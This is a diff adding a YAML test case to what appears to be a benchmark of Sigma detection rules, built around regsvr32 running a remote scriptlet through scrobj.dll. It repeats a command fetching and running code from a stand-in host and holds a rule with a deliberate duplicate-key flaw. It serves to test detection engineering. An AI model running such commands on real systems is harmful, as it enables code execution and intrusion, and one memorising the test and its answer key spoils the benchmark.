@@ -1,0 +1,109 @@
+id: D1-06
+role: defective
+defect_class: D1
+evasive: true
+why: The selection mapping contains the key CommandLine|contains twice with different values. YAML requires
+  unique mapping keys, and lenient parsers silently keep only the last one, discarding the '/i:http' constraint
+  the author intended to AND with 'scrobj.dll'.
+expected_gate: G1
+report_text: 'After obtaining a foothold on a build server, the operator used regsvr32.exe to run a remote
+  scriptlet and avoid dropping a payload to disk. The captured command line was regsvr32.exe /s /n /u
+  /i:https://files.driftmoor-cdn.test/r.sct scrobj.dll, which makes the registration utility fetch the
+  scriptlet over HTTPS and execute it through the scripting runtime library. The technique works without
+  administrative rights and leaves no registry changes when the unregister flag is supplied. Defenders
+  should note that legitimate use of regsvr32.exe almost always names a local DLL or OCX file, whereas
+  this activity combined an /i: argument pointing at a web address with scrobj.dll. The operator repeated
+  the call on two further servers using other scriptlet names.'
+evidence:
+- regsvr32.exe /s /n /u /i:https://files.driftmoor-cdn.test/r.sct scrobj.dll
+- 'an /i: argument pointing at a web address with scrobj.dll'
+logsource: windows_process_creation
+techniques:
+- T1218.010
+sigma_yaml: |
+  title: Regsvr32 Running A Remote Scriptlet Through Scrobj
+  id: e53a0c17-9b2d-4f64-8d31-a7c4f2b95e08
+  status: experimental
+  description: Detects regsvr32.exe running a remote scriptlet through scrobj.dll when the install argument points at a web address.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.stealth
+    - attack.t1218.010
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\regsvr32.exe'
+      CommandLine|contains: '/i:http'
+      CommandLine|contains: 'scrobj.dll'
+    condition: selection
+  falsepositives:
+    - Software deployment tooling that registers scriptlet components from an internal web server
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32.exe /s /n /u /i:https://files.driftmoor-cdn.test/r.sct scrobj.dll
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\svc_build
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\SysWOW64\regsvr32.exe
+    cmd: regsvr32.exe /s /n /u /i:https://files.driftmoor-cdn.test/ld2.sct scrobj.dll
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\svc_build
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\whoami.exe
+    cmd: whoami /all
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\net.exe
+    cmd: net.exe user
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32.exe /s "C:\Program Files\Northwind\Shell\nwshell.dll"
+    parent: C:\Windows\System32\msiexec.exe
+    parent_cmd: msiexec.exe /i nwshell.msi
+    user: NT AUTHORITY\SYSTEM
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32.exe /u /s C:\Windows\System32\oldcodec.dll
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\itadmin
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
